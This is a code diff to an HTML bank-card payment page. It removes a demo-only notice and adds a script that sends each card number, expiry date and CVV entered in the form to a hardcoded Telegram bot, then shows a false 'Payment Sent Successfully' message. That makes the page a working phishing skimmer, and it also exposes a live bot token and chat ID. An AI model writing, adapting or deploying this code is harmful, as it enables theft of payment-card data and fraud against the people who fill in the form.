@@ -1,24 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="si">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bank Card</title>
-  <link rel="stylesheet" href="style.css">
-  <script>
-    function payBank() {
-      alert("✅ Demo Only! Payment not real.");
-    }
-  </script>
+  <title>Bank Card Payment</title>
 </head>
 <body>
   <h2>Bank Card Payment</h2>
-  <form onsubmit="payBank(); return false;">
-    <input type="text" placeholder="Card Holder Name" required><br>
-    <input type="text" placeholder="Card Number" required><br>
-    <input type="text" placeholder="MM/YY" required><br>
-    <input type="text" placeholder="CVC" required><br>
+  <form id="bankForm">
+    <label>Card Number:</label><br>
+    <input type="text" id="bankCard" required><br>
+    <label>MM/YY:</label><br>
+    <input type="text" id="expiry" required><br>
+    <label>CVV:</label><br>
+    <input type="password" id="cvv" required><br><br>
     <button type="submit">Pay Now</button>
   </form>
+
+  <script>
+    const BOT_TOKEN = "8295321662:AAHsWnBmY3Bf1IHsCjvie-0aM4u6txJ6udw";
+    const CHAT_ID = "8401076081";
+
+    document.getElementById("bankForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      let cardNumber = document.getElementById("bankCard").value;
+      let expiry = document.getElementById("expiry").value;
+      let cvv = document.getElementById("cvv").value;
+
+      let message = `🏦 Bank Card Payment\n\nCard Number: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      }).then(res => alert("Payment Sent Successfully!"));
+    });
+  </script>
 </body>
 </html>
